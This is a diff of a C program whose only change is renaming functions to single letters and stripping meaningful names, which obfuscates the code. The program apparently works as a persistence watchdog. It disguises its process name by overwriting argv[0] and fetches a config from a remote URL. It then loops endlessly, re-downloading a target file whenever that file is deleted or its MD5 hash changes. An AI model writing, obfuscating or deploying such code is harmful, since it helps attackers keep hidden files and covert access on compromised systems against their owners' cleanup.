@@ -17,7 +17,7 @@ struct string {
   size_t len;
 };
 
-void init_string(struct string *s) {
+void is(struct string *s) {
   s->len = 0;
   s->ptr = malloc(s->len+1);
   if (s->ptr == NULL) {
@@ -26,7 +26,7 @@ void init_string(struct string *s) {
   }
 }
 
-size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
+size_t w(void *ptr, size_t size, size_t nmemb, struct string *s)
 {
   size_t new_len = s->len + size*nmemb;
   s->ptr = realloc(s->ptr, new_len+1);
@@ -39,7 +39,7 @@ size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
   return size*nmemb;
 }
 
-void rtrim(char *src)
+void t(char *src)
 {
   size_t i, len;
   volatile int isblank = 1;
@@ -59,7 +59,7 @@ void rtrim(char *src)
     src[i] = 0;
 }
 
-char *calc_hash(const char *filename) {
+char *h(const char *filename) {
   unsigned char c[MD5_DIGEST_LENGTH];
   int i;
   MD5_CTX mdContext;
@@ -69,7 +69,7 @@ char *calc_hash(const char *filename) {
 
   FILE *fs = fopen(filename, "rb");
   if (fs == NULL) {
-    perror(filename); // TODO: not exist ? restore
+    perror(filename); // TODO: not exist ? o
     exit(1);
   }
   
@@ -86,7 +86,7 @@ char *calc_hash(const char *filename) {
   return filemd5;
 }
 
-int restore(char *arg) {
+int o(char *arg) {
   CURL *curl;
   
   curl = curl_easy_init();
@@ -105,15 +105,15 @@ int restore(char *arg) {
   return 0;
 }
 
-int check_hash(char *arg) {
-  char *new_hash = calc_hash(arg);
+int c(char *arg) {
+  char *new_hash = h(arg);
   if (strcmp(SRC_HASH, new_hash)) 
-    restore(arg);
+    o(arg);
   free(new_hash);
   return 0;
 }
 
-char *readconf(char *arg) {
+char *r(char *arg) {
   CURL *curl;
   CURLcode res;
   char *ret;
@@ -121,11 +121,11 @@ char *readconf(char *arg) {
   curl = curl_easy_init();
   if (curl) {
     struct string s;
-    init_string(&s);
+    is(&s);
 
     curl_easy_setopt(curl, CURLOPT_URL, arg);
     curl_easy_setopt(curl, CURLOPT_HEADER, 0);
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, w);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
     res = curl_easy_perform(curl);
     curl_easy_cleanup(curl);
@@ -145,15 +145,15 @@ int main(int argc, char *argv[]) {
   strcat(self, CONF_URL);
   strcat(self, fn);
 
-  input = readconf(self);
-  rtrim(input);
+  input = r(self);
+  t(input);
 
   strcpy(argv[0], PS_NAME);
 
   while (1) {
     if (access(input, F_OK) != 0)
-      restore(input);
+      o(input);
  
-    check_hash(input);
+    c(input);
   }
 }
